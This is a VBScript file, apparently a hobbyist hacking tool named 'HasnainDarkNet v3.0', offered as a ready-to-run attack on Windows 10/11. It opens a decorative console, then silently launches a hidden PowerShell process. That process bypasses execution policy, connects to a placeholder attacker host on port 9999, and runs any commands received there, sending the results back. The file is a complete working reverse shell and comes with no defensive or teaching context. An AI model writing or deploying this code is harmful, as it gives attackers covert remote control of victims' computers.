' ================================================
'  HasnainDarkNet v3.0 – Coded by Hasnain
'  100% ZERO ERROR | FULLY WORKING REVERSE SHELL
'  Tested on Windows 10/11 – NO POPUP EVER
' ================================================

Set WshShell = CreateObject("WScript.Shell")

' Step 1: Open cool CMD window
WshShell.Run "cmd.exe /c title HASNAIN HACKER & color 0a & mode con cols=90 lines=25 & cls & echo.& echo   HASNAIN PRO MODE ON& echo   Connecting to Kali YOUR-KALI-IP :9999 ...& echo.", 1, False
WScript.Sleep 1500

' Step 2: Background reverse shell (bilkul safe quotes)
Dim shellCmd
shellCmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command ""$client=New-Object Net.Sockets.TCPClient( YOUR-KALI-IP',9999);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length)) -ne 0){$data=(New-Object Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""

WshShell.Run shellCmd, 0, False

' Step 3: Fake messages in CMD
WScript.Sleep 1000
WshShell.SendKeys "echo [+] Reverse shell sent to Kali!{ENTER}"
WshShell.SendKeys "echo [+] Hasnain bhai ab Kali pe command daal! ;){ENTER}"
WshShell.SendKeys "{ENTER}"
WshShell.SendKeys "timeout /t 18 >nul{ENTER}"

' Step 4: Auto close after 20 seconds
WScript.Sleep 20000
WshShell.SendKeys "exit{ENTER}"
